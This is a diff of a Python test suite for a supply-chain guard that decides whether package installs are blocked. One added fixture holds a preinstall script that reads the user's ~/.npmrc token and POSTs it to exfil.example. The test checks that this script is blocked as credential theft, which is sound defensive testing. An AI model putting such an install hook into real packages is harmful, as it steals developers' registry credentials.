@@ -141,6 +141,7 @@ def _package(
     known_exploited: bool = True,
     malware_state: str = "known",
     namespace: str | None = None,
+    source_integrity_state: str = "high-risk",
     recommended_fix_version: str | None = None,
     risk_score: int = 980,
 ) -> dict[str, object]:
@@ -160,7 +161,7 @@ def _package(
         "recommendedFixVersion": recommended_fix_version,
         "relatedAdvisoryIds": ["GHSA-vh95-rmgr-6w4m"],
         "riskScore": risk_score,
-        "sourceIntegrityState": "high-risk",
+        "sourceIntegrityState": source_integrity_state,
         "version": version,
     }
 
@@ -699,6 +700,37 @@ def test_evaluate_package_request_artifact_blocks_external_tarball_install_scrip
     assert marker_path.exists() is False
 
 
+def test_evaluate_package_request_artifact_blocks_shai_hulud_style_credential_theft_tarball_fixture(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    package_json = json.dumps(
+        {
+            "name": "shai-hulud-fixture",
+            "version": "1.0.0",
+            "scripts": {
+                "preinstall": (
+                    'node -e "const fs=require(\'fs\'); const https=require(\'https\'); '
+                    "const token=fs.readFileSync(process.env.HOME + '/.npmrc','utf8'); "
+                    "const req=https.request({hostname:'exfil.example',method:'POST'}); "
+                    "req.end(token);\""
+                )
+            },
+        }
+    ).encode("utf-8")
+    archive = _tarball_bytes([("package/package.json", package_json)])
+    monkeypatch.setattr(evaluator_module, "_download_external_tarball", lambda *_args, **_kwargs: archive)
+    result = evaluate_package_request_artifact(
+        artifact=_artifact_for_targets("https://packages.example.com/shai-hulud-fixture.tgz"),
+        store=GuardStore(tmp_path / "guard-home"),
+        workspace_dir=tmp_path / "workspace",
+        now="2026-05-19T00:00:00Z",
+    )
+
+    assert result.decision == "block"
+    assert result.policy_action == "block"
+    assert any(reason["code"] == "credential_theft_install_script" for reason in result.reasons)
+
+
 def test_evaluate_package_request_artifact_reviews_clean_external_tarball(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
@@ -1095,6 +1127,46 @@ def test_evaluate_package_request_artifact_summarizes_multi_package_and_safe_alt
     assert len(result.packages) == 2
     assert "lodash" in result.user_copy.summary.lower()
     assert "1.2.9" in (result.user_copy.next_step or "")
+
+
+def test_evaluate_package_request_artifact_blocks_maintainer_compromise_fixture(
+    tmp_path: Path,
+) -> None:
+    store = GuardStore(tmp_path / "guard-home")
+    store.set_sync_credentials(
+        "https://hol.org/api/guard/receipts/sync", "demo-token", "2026-05-19T00:00:00Z", workspace_id=WORKSPACE_ID
+    )
+    response = _bundle_response(
+        packages=[
+            _package(
+                ecosystem="npm",
+                name="trusted-build-tools",
+                version="5.4.0",
+                default_action="block",
+                exploit_level="elevated",
+                known_exploited=False,
+                malware_state="suspected",
+                normalized_severity="high",
+                recommended_fix_version=None,
+                risk_score=930,
+                source_integrity_state="high-risk",
+            )
+        ]
+    )
+    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+
+    result = evaluate_package_request_artifact(
+        artifact=_artifact_for_targets("trusted-build-tools@5.4.0"),
+        store=store,
+        workspace_dir=workspace_dir,
+        now="2026-05-19T00:00:00Z",
+    )
+
+    assert result.decision == "block"
+    assert result.policy_action == "block"
+    assert any(reason["code"] == "maintainer_compromise" for reason in result.reasons)
 
 
 def test_evaluate_package_request_artifact_blocks_transitive_lockfile_match_with_dependency_path(
